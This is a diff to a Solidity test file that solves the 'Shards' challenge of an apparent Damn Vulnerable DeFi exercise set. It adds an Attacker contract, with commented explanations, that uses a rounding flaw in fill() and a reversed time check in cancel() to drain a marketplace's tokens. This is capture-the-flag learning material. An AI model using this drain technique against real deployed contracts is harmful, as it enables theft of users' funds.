@@ -12,6 +12,8 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +116,13 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new Attacker(AttackData({
+            MARKETPLACE_INITIAL_RATE: MARKETPLACE_INITIAL_RATE,
+            marketplace: marketplace,
+            token: token,
+            player: player,
+            recovery: recovery
+        })).attack();
     }
 
     /**
@@ -134,5 +142,81 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+struct AttackData {
+    uint256 MARKETPLACE_INITIAL_RATE;
+    ShardsNFTMarketplace marketplace;
+    DamnValuableToken token;
+    address player;
+    address recovery;
+}
+
+contract Attacker {
+    AttackData private $;
+
+    constructor(AttackData memory attackData) {
+        $ = attackData;
+    }
+
+    function attack() external {
+        // Recall that we don't have any DVT.
+        // ShardsNFTMarketplace::fill() will work as long as it has to transfer
+        // less than 1 DVT (as in 1 wei, not 1e18).
+        // To accomplish that, we solve
+        //   want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards) < 1
+        //   want < (offer.totalShards * 1e6) / (offer.price * _currentRate) ≈ 133.33
+        //   want = 133.
+        uint256 purchaseIndex = $.marketplace.fill(1, 133);
+
+        // Here, we exploit a bug in ShardsNFTMarketplace::cancel().
+        // The condition:
+        //   block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
+        // is incorrect; the comparison sign is reversed. The intended condition is:
+        //   block.timestamp < purchase.timestamp + TIME_BEFORE_CANCEL
+        // This logic enforces:
+        //   block.timestamp - purchase.timestamp < TIME_BEFORE_CANCEL
+        // meaning, "If the difference between the current time and the purchase time
+        // is less than TIME_BEFORE_CANCEL, the cancel attempt will fail."
+        //
+        // For example: If the purchase was made at timestamp 1, and the current
+        // block timestamp is 100, with TIME_BEFORE_CANCEL set to 1000, the cancel
+        // will fail because the cancel is only valid when the current timestamp
+        // reaches or exceeds 1001.
+        //
+        // Due to the reversed logic in the bug, we can issue a cancellation
+        // immediately after completing a purchase.
+        $.marketplace.cancel(1, purchaseIndex);
+
+        // Not only the bug mentioned above, but there is a bug in the conversion,
+        // where we get `purchase.shards.mulDivUp(purchase.rate, 1e6)` DVT (the result is 9.975e12).
+        uint256 amountDVTFirstPurchase =
+            FixedPointMathLib.mulDivDown(
+                133,
+                $.MARKETPLACE_INITIAL_RATE,
+                1e6
+            );
+
+        // We repeat this process to drain the marketplace.
+        // First, we compute the number of shards needed to acquire the remaining DVT balance from the marketplace.
+        // The formula for calculating the required shards is:
+        //   purchase.shards.mulDivUp(purchase.rate, 1e6) = token.balanceOf(address(marketplace)) - amountDVTFirstPurchase
+        // or equivalently:
+        //   (purchase.shards * purchase.rate) / 1e6 = token.balanceOf(address(marketplace)) - amountDVTFirstPurchase
+        // Solving for purchase.shards gives:
+        //   purchase.shards = ((token.balanceOf(address(marketplace)) - amountDVTFirstPurchase) * 1e6) / purchase.rate
+        uint256 amountShardsSecondPurchase =
+            FixedPointMathLib.mulDivDown(
+                ($.token.balanceOf(address($.marketplace)) - amountDVTFirstPurchase),
+                1e6,
+                $.MARKETPLACE_INITIAL_RATE
+            );
+        $.token.approve(address($.marketplace), amountDVTFirstPurchase);
+        purchaseIndex = $.marketplace.fill(1, amountShardsSecondPurchase);
+        $.marketplace.cancel(1, purchaseIndex);
+
+        // Send the balance to the recovery account
+        $.token.transfer($.recovery, $.token.balanceOf(address(this)));
     }
 }
